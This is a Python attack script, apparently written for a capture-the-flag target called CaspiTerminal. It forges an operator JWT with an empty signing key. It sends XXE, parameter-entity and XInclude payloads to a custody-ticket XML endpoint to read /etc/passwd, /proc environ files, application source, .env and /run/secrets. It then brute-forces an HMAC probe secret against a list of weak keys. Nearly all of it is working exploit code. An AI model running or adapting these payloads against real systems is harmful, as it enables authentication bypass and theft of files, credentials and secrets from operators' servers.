#!/usr/bin/env python3
"""round29_xxe_extract.py — XXE extraction of PROBE_SECRET from CaspiTerminal"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH = {"Authorization": f"Bearer {jwt('operator')}"}

def xxe_read(path, field="remarks"):
    """Standard XXE file read"""
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH, "Content-Type":"application/xml"}, timeout=15)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)[:200]

def xxe_multi(path):
    """Read file in all 3 fields for max coverage"""
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>&x;</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>&x;</carrier>
  <remarks>&x;</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH, "Content-Type":"application/xml"}, timeout=15)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)[:200]

# ============================================================
print("="*70)
print("PHASE 1: CONFIRM XXE WORKS")
print("="*70)

code, body = xxe_read("/etc/passwd")
print(f"  /etc/passwd: [{code}]")
if code == 200:
    try:
        d = json.loads(body)
        val = d.get("summary",{}).get("remarks","")
        print(f"  Content ({len(val)} chars):")
        print(val[:500])
    except:
        print(f"  Raw: {body[:300]}")
else:
    print(f"  FAILED: {body[:200]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: READ ALL /app/ FILES")
print("="*70)

files_to_try = [
    "/app/app.py",
    "/app/auth.py",
    "/app/db.py",
    "/app/probe.py",
    "/app/config.py",
    "/app/settings.py",
    "/app/secret.py",
    "/app/secrets.py",
    "/app/models.py",
    "/app/views.py",
    "/app/routes.py",
    "/app/api.py",
    "/app/ops.py",
    "/app/custody.py",
    "/app/diagnostics.py",
    "/app/utils.py",
    "/app/helpers.py",
    "/app/constants.py",
    "/app/entrypoint.sh",
    "/app/run.sh",
    "/app/start.sh",
    "/app/gunicorn.conf.py",
    "/app/requirements.txt",
    "/app/.env",
    "/app/config.ini",
    "/app/config.json",
    "/app/config.yaml",
    "/app/config.yml",
    "/app/config.toml",
    "/app/Dockerfile",
    "/app/docker-compose.yml",
    "/app/Makefile",
    "/app/wsgi.py",
    "/app/manage.py",
]

for fpath in files_to_try:
    code, body = xxe_read(fpath)
    if code == 200:
        try:
            d = json.loads(body)
            val = d.get("summary",{}).get("remarks","")
            if val and val not in ["R", ""]:
                print(f"\n  [READABLE] {fpath}:")
                print(f"  {val[:500]}")
                if len(val) > 500:
                    print(f"  ... ({len(val)} total chars)")
            else:
                ref = d.get("summary",{}).get("reference","")
                carrier = d.get("summary",{}).get("carrier","")
                status = d.get("status","")
                if status == "rejected":
                    print(f"  [EXISTS/REJECTED] {fpath}: {d.get('error','')[:100]}")
                elif ref != "r" or carrier != "C":
                    print(f"  [PARTIAL] {fpath}: ref={ref[:50]} carrier={carrier[:50]}")
                else:
                    print(f"  [EMPTY] {fpath}")
        except:
            if "rejected" in body:
                print(f"  [EXISTS/REJECTED] {fpath}: {body[:100]}")
            elif code == 200:
                print(f"  [EXISTS?] {fpath}: {body[:100]}")
    elif code == 400:
        print(f"  [BAD REQUEST] {fpath}: {body[:100]}")
    elif code == 500:
        print(f"  [SERVER ERROR] {fpath}: {body[:100]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 3: ENVIRONMENT & PROC FILES")
print("="*70)

proc_files = [
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/1/environ",
    "/proc/1/cmdline",
    "/proc/self/status",
    "/proc/self/maps",
    "/proc/self/cgroup",
    "/proc/self/mountinfo",
    "/proc/self/mounts",
    "/proc/version",
    "/proc/self/fd/0",
    "/proc/self/fd/3",
    "/proc/self/fd/4",
    "/proc/self/fd/5",
    "/etc/environment",
    "/etc/profile",
    "/etc/hostname",
    "/run/secrets/probe_secret",
    "/run/secrets/hmac_key",
    "/run/secrets/secret",
    "/var/run/secrets/probe_secret",
]

for fpath in proc_files:
    code, body = xxe_read(fpath)
    if code == 200:
        try:
            d = json.loads(body)
            val = d.get("summary",{}).get("remarks","")
            if val and val not in ["R", ""]:
                print(f"\n  [READABLE] {fpath}:")
                print(f"  {val[:600]}")
            else:
                status = d.get("status","")
                err = d.get("error","")[:100]
                if status == "rejected":
                    print(f"  [REJECTED] {fpath}: {err}")
                else:
                    print(f"  [EMPTY/DEFAULT] {fpath}")
        except:
            if "rejected" in body:
                print(f"  [REJECTED] {fpath}: {body[:80]}")
            else:
                print(f"  [???] {fpath}: {body[:80]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: ERROR-BASED EXTRACTION")
print("="*70)

# When a file contains < or &, the XML parser might include
# partial content in the error message. Let's capture FULL responses.
problem_files = ["/app/app.py", "/app/auth.py", "/app/entrypoint.sh"]

for fpath in problem_files:
    code, body = xxe_read(fpath)
    print(f"\n  {fpath}: [{code}]")
    print(f"  Full response ({len(body)} bytes):")
    print(f"  {body[:1000]}")

    # Also try with different fields to get different error contexts
    code2, body2 = xxe_read(fpath, field="reference")
    if body2 != body:
        print(f"  [reference field]: {body2[:500]}")

    code3, body3 = xxe_read(fpath, field="carrier")
    if body3 != body and body3 != body2:
        print(f"  [carrier field]: {body3[:500]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: PARAMETER ENTITY TRICKS (NEW INSTANCE)")
print("="*70)

# Test if parameter entities work on new instance
pe_tests = [
    # 1. Basic parameter entity
    ("basic PE", '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % f SYSTEM "file:///etc/hostname">
  %f;
]>
<ticket><reference>test</reference><tankId>T-01</tankId><product>D</product>
<grossVolume>1</grossVolume><netVolume>1</netVolume><density>1</density>
<temperature>1</temperature><carrier>C</carrier><remarks>R</remarks></ticket>'''),

    # 2. PE with general entity definition
    ("PE define GE", '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % f SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY x '%f;'>">
  %eval;
]>
<ticket><reference>&x;</reference><tankId>T-01</tankId><product>D</product>
<grossVolume>1</grossVolume><netVolume>1</netVolume><density>1</density>
<temperature>1</temperature><carrier>C</carrier><remarks>R</remarks></ticket>'''),

    # 3. CDATA wrapper attempt
    ("CDATA wrap", '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % s "&#60;![CDATA[">
  <!ENTITY % e "]]&#62;">
  <!ENTITY % f SYSTEM "file:///app/app.py">
  <!ENTITY % all "<!ENTITY x '%s;%f;%e;'>">
  %all;
]>
<ticket><reference>&x;</reference><tankId>T-01</tankId><product>D</product>
<grossVolume>1</grossVolume><netVolume>1</netVolume><density>1</density>
<temperature>1</temperature><carrier>C</carrier><remarks>R</remarks></ticket>'''),

    # 4. XInclude
    ("XInclude", '''<?xml version="1.0" encoding="UTF-8"?>
<ticket xmlns:xi="http://www.w3.org/2001/XInclude">
  <reference><xi:include href="file:///etc/hostname" parse="text"/></reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume><density>1</density>
  <temperature>1</temperature><carrier>C</carrier><remarks>R</remarks>
</ticket>'''),

    # 5. XInclude with parse=xml and CDATA fallback
    ("XInclude fallback", '''<?xml version="1.0" encoding="UTF-8"?>
<ticket xmlns:xi="http://www.w3.org/2001/XInclude">
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume><density>1</density>
  <temperature>1</temperature>
  <carrier>C</carrier>
  <remarks><xi:include href="file:///app/app.py" parse="text">
    <xi:fallback>FALLBACK</xi:fallback>
  </xi:include></remarks>
</ticket>'''),

    # 6. Entity within CDATA section
    ("entity in CDATA", '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume><density>1</density>
  <temperature>1</temperature>
  <carrier>C</carrier>
  <remarks><![CDATA[prefix]]>&x;<![CDATA[suffix]]></remarks>
</ticket>'''),
]

for label, xml in pe_tests:
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH, "Content-Type":"application/xml"}, timeout=15)
        body = r.text
        code = r.status_code
        # Check for content
        try:
            d = json.loads(body)
            remarks = d.get("summary",{}).get("remarks","")
            ref = d.get("summary",{}).get("reference","")
            status = d.get("status","")
            err = d.get("error","")
            if remarks not in ["R","","FALLBACK"] or ref not in ["r","test",""]:
                print(f"  [{label}] [{code}] STATUS={status} ref={ref[:50]} remarks={remarks[:200]} <<< DATA!")
            else:
                print(f"  [{label}] [{code}] STATUS={status} err={err[:100]}")
        except:
            print(f"  [{label}] [{code}] {body[:150]}")
    except Exception as e:
        print(f"  [{label}] ERROR: {str(e)[:100]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 6: DEEPER /app/ DIRECTORY LISTING")
print("="*70)

# Try reading directory (probably won't work but worth trying)
for dpath in ["/app/", "/app", "/app/.", "/app/templates/", "/app/blueprints/"]:
    code, body = xxe_read(dpath)
    try:
        d = json.loads(body)
        val = d.get("summary",{}).get("remarks","")
        if val and val != "R":
            print(f"  {dpath}: {val[:300]}")
        else:
            print(f"  {dpath}: [{code}] status={d.get('status','')} err={d.get('error','')[:80]}")
    except:
        print(f"  {dpath}: [{code}] {body[:100]}")

# Also try common Python app structures
more_files = [
    "/app/blueprints/__init__.py",
    "/app/blueprints/ops.py",
    "/app/blueprints/auth.py",
    "/app/api/__init__.py",
    "/app/api/ops.py",
    "/app/api/auth.py",
    "/app/api/probe.py",
    "/app/__init__.py",
    "/app/flask_app.py",
    "/app/create_app.py",
    "/app/factory.py",
    "/app/extensions.py",
]

for fpath in more_files:
    code, body = xxe_read(fpath)
    if code == 200:
        try:
            d = json.loads(body)
            val = d.get("summary",{}).get("remarks","")
            status = d.get("status","")
            if val and val != "R":
                print(f"  [READABLE] {fpath}: {val[:300]}")
            elif status == "rejected":
                print(f"  [EXISTS/REJECTED] {fpath}: {d.get('error','')[:80]}")
            else:
                print(f"  [EMPTY] {fpath}")
        except:
            if "rejected" in body:
                print(f"  [EXISTS/REJECTED] {fpath}")

# ============================================================
print("\n"+"="*70)
print("PHASE 7: READ READABLE FILES IN FULL")
print("="*70)

# Re-read known readable files with all fields
for fpath in ["/app/db.py", "/app/requirements.txt", "/app/gunicorn.conf.py",
              "/etc/hostname", "/etc/passwd"]:
    code, body = xxe_read(fpath, field="remarks")
    if code == 200:
        try:
            d = json.loads(body)
            val = d.get("summary",{}).get("remarks","")
            if val and val != "R":
                print(f"\n  === {fpath} ===")
                print(val)
        except:
            pass

# ============================================================
print("\n"+"="*70)
print("PHASE 8: PROBE SECRET VERIFICATION")
print("="*70)

# Test if we found any secrets, try to forge probe signatures
# Known pair: lm-01 → http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow
#              sig = 5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09
known_url = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# If we found any candidate secrets from file reads, test them here
print("  Known URL:", known_url)
print("  Known sig:", known_sig)
print("  (Will test candidate keys found above)")

# Also try common weak secrets
weak_keys = [
    b"probe_secret", b"secret", b"ProbeSecret", b"PROBE_SECRET",
    b"changeme", b"password", b"CaspiTerminal", b"caspiterminal",
    b"terminal", b"gauge-gw", b"aktau", b"mangystau",
    b"caspi", b"probe", b"hmac_secret", b"hmac_key",
    b"terminal_secret", b"ops_secret", b"gw_secret",
    b"APT-AKTAU-01", b"041240001357",
    b"pk_probe_secret", b"probe_key", b"signing_key",
]

print("\n  Testing weak keys...")
for key in weak_keys:
    sig = hm.new(key, known_url.encode(), hashlib.sha256).hexdigest()
    if sig == known_sig:
        print(f"  FOUND KEY: {key} <<<<<<")
        break
    # Also try key as hex/base64
    try:
        sig2 = hm.new(base64.b64decode(key), known_url.encode(), hashlib.sha256).hexdigest()
        if sig2 == known_sig:
            print(f"  FOUND KEY (b64): {key} <<<<<<")
            break
    except:
        pass
else:
    print("  No weak key matched")

print("\n"+"="*70)
print("DONE")
print("="*70)
